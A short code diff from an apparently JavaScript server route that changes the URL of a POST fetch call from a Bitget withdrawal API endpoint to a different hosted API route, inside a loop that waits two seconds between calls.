@@ -52,7 +52,7 @@ export async function GET() {
           // Add a 2-second delay between each API call
           await delay(2000);
   
-          const response = await fetch('https://bitgetapi.onrender.com/api/withdrawal', {
+          const response = await fetch('https://eurobankv2.vercel.app/api/bitget', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
